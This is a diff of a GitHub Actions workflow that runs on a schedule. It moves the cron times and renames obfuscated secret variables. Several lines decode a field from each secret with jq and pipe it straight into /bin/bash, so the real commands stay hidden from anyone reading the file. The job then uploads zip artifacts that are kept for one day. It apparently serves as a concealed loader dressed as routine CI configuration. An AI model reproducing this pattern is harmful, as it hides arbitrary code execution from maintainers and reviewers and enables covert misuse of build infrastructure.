@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '28 2,8,14,20 * * *'
+    - cron: '15 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -24,19 +24,16 @@ jobs:
           fetch-depth: 1
       - name: Execute
         env:
-          es6: ${{ secrets.es6 }}
+          aaqpn7092: ${{ secrets.aaqpn7092 }}
         run: |
-          printf '%s' "$es6" | jq -r .hl7 | /bin/bash
-          echo $kw69 | jq -r .qzi65 | /bin/bash
-          echo $efpg61 | jq -r .tu70 | /bin/bash
-          echo $r06704 | jq -r .ouf23 | /bin/bash
-          echo $jznot93690 | jq -r .regl32 | /bin/bash
-          printf '%s' "$bswwc25970" | jq -r .sxeph8 | /bin/bash
+          printf '%s' "$aaqpn7092" | jq -r .miiy1 | /bin/bash
+          printf '%s' "$s6513" | jq -r .oe3 | /bin/bash
+          printf '%s' "$e2718" | jq -r .mlwf05478 | /bin/bash
 
       - name: Upload artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: mulSdmoU
+          name: seUTGkpG
           path: "*.zip"
           retention-days: 1
